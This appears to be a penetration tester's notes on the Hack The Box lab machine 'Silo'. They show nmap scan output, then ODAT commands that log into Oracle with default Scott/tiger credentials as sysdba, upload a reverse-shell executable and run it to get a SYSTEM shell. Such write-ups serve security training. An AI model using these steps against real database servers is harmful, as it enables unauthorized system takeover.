``` SILO - 10.10.10.82```

```
nmap -sS -p- -v 10.10.10.82 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 03:43 EDT
Initiating Ping Scan at 03:43
Scanning 10.10.10.82 [4 ports]
Completed Ping Scan at 03:43, 0.30s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:43
Completed Parallel DNS resolution of 1 host. at 03:43, 0.00s elapsed
Initiating SYN Stealth Scan at 03:43
Scanning 10.10.10.82 [65535 ports]
Discovered open port 80/tcp on 10.10.10.82
Discovered open port 135/tcp on 10.10.10.82
Discovered open port 445/tcp on 10.10.10.82
Discovered open port 139/tcp on 10.10.10.82
Increasing send delay for 10.10.10.82 from 0 to 5 due to 632 out of 2105 dropped probes since last increase.
SYN Stealth Scan Timing: About 4.93% done; ETC: 03:53 (0:09:58 remaining)
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 5.40% done; ETC: 03:57 (0:13:43 remaining)
SYN Stealth Scan Timing: About 6.22% done; ETC: 04:04 (0:19:22 remaining)
SYN Stealth Scan Timing: About 6.85% done; ETC: 04:09 (0:24:14 remaining)
SYN Stealth Scan Timing: About 7.40% done; ETC: 04:14 (0:28:35 remaining)
SYN Stealth Scan Timing: About 8.07% done; ETC: 04:17 (0:31:43 remaining)
SYN Stealth Scan Timing: About 8.70% done; ETC: 04:21 (0:34:28 remaining)
SYN Stealth Scan Timing: About 9.38% done; ETC: 04:23 (0:36:34 remaining)
Stats: 0:04:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 10.53% done; ETC: 04:25 (0:37:40 remaining)
Stats: 0:04:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 10.63% done; ETC: 04:25 (0:37:41 remaining)
SYN Stealth Scan Timing: About 13.14% done; ETC: 04:21 (0:32:56 remaining)
Discovered open port 49155/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 15.49% done; ETC: 04:18 (0:29:55 remaining)
SYN Stealth Scan Timing: About 17.65% done; ETC: 04:17 (0:27:56 remaining)
Stats: 0:06:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                                                                            
SYN Stealth Scan Timing: About 18.52% done; ETC: 04:16 (0:27:12 remaining)                                                                                                 
Discovered open port 49162/tcp on 10.10.10.82                                                                                                                              
SYN Stealth Scan Timing: About 21.06% done; ETC: 04:15 (0:25:26 remaining)                                                                                                 
Stats: 0:06:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                                                                            
SYN Stealth Scan Timing: About 21.38% done; ETC: 04:15 (0:25:11 remaining)                                                                                                 
Discovered open port 49154/tcp on 10.10.10.82                                                                                                                              
SYN Stealth Scan Timing: About 23.89% done; ETC: 04:14 (0:23:34 remaining)
SYN Stealth Scan Timing: About 26.87% done; ETC: 04:13 (0:21:54 remaining)
SYN Stealth Scan Timing: About 30.07% done; ETC: 04:12 (0:20:21 remaining)
Discovered open port 49153/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 33.47% done; ETC: 04:11 (0:18:47 remaining)
Stats: 0:09:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 36.10% done; ETC: 04:11 (0:17:42 remaining)
SYN Stealth Scan Timing: About 40.61% done; ETC: 04:10 (0:16:18 remaining)
Discovered open port 49158/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 44.99% done; ETC: 04:10 (0:14:51 remaining)
Discovered open port 1521/tcp on 10.10.10.82
Discovered open port 49161/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 49.50% done; ETC: 04:10 (0:13:25 remaining)
Stats: 0:13:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 50.27% done; ETC: 04:09 (0:13:10 remaining)
Stats: 0:13:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 50.31% done; ETC: 04:09 (0:13:09 remaining)
Stats: 0:13:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 50.33% done; ETC: 04:09 (0:13:10 remaining)
SYN Stealth Scan Timing: About 54.75% done; ETC: 04:09 (0:11:48 remaining)
SYN Stealth Scan Timing: About 59.63% done; ETC: 04:09 (0:10:27 remaining)
Discovered open port 47001/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 64.66% done; ETC: 04:09 (0:09:07 remaining)
Stats: 0:16:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.83% done; ETC: 04:09 (0:09:04 remaining)
Stats: 0:16:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.88% done; ETC: 04:09 (0:09:04 remaining)
Stats: 0:16:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 66.33% done; ETC: 04:09 (0:08:37 remaining)
Discovered open port 5985/tcp on 10.10.10.82
Discovered open port 49152/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 71.11% done; ETC: 04:08 (0:07:20 remaining)
SYN Stealth Scan Timing: About 75.80% done; ETC: 04:08 (0:06:04 remaining)
SYN Stealth Scan Timing: About 80.75% done; ETC: 04:08 (0:04:47 remaining)
SYN Stealth Scan Timing: About 85.69% done; ETC: 04:08 (0:03:31 remaining)
Discovered open port 49160/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 90.74% done; ETC: 04:07 (0:02:15 remaining)
SYN Stealth Scan Timing: About 95.91% done; ETC: 04:07 (0:00:59 remaining)
Completed SYN Stealth Scan at 04:07, 1459.88s elapsed (65535 total ports)
Nmap scan report for 10.10.10.82
Host is up (0.22s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown
49162/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1460.37 seconds
           Raw packets sent: 72308 (3.182MB) | Rcvd: 67872 (2.739MB)
```
           


```
nmap -sC -sV -p 80,135,139,445,1521,5985,47001 10.10.10.82
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 04:35 EDT
Nmap scan report for 10.10.10.82
Host is up (0.22s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m51s, deviation: 0s, median: 2m50s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-10T08:38:36
|_  start_date: 2020-05-10T06:29:17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds

```

```
nmap -sC -sV -p 49152,48153,49154,49155,49158,49160,49161,49162 10.10.10.82
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 04:50 EDT
Nmap scan report for 10.10.10.82
Host is up (0.22s latency).

PORT      STATE  SERVICE    VERSION
48153/tcp closed unknown
49152/tcp open   msrpc      Microsoft Windows RPC
49154/tcp open   msrpc      Microsoft Windows RPC
49155/tcp open   msrpc      Microsoft Windows RPC
49158/tcp open   msrpc      Microsoft Windows RPC
49160/tcp open   oracle-tns Oracle TNS listener (requires service name)
49161/tcp open   msrpc      Microsoft Windows RPC
49162/tcp open   msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.13 seconds

```

Learn that there are 2 oracle listeners here

1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)


49160/tcp open   oracle-tns Oracle TNS listener (requires service name)


```Odat```

-- sysdba is like sudo

```
https://github.com/quentinhardy/odat
```

```
./odat-libc2.12-x86_64 utlfile -s 10.10.10.82 -d XE -U Scott -P tiger --sysdba  --putFile "C:\Windows\Temp" rev1.exe /root/Desktop/OSCP-Prep/HTB/Windows/Silo/rev1.exe
```

```
./odat-libc2.12-x86_64 externaltable -s 10.10.10.82 -d XE -U Scott -P tiger --sysdba --exec "C:\Windows\Temp" rev1.exe
```
--- I get a direct system shell coz of the fact that the oracle db is running with system privileges



- The file I used to crack the password is accounts.txt

```
File Sharing
```

```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
```

```
https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573
```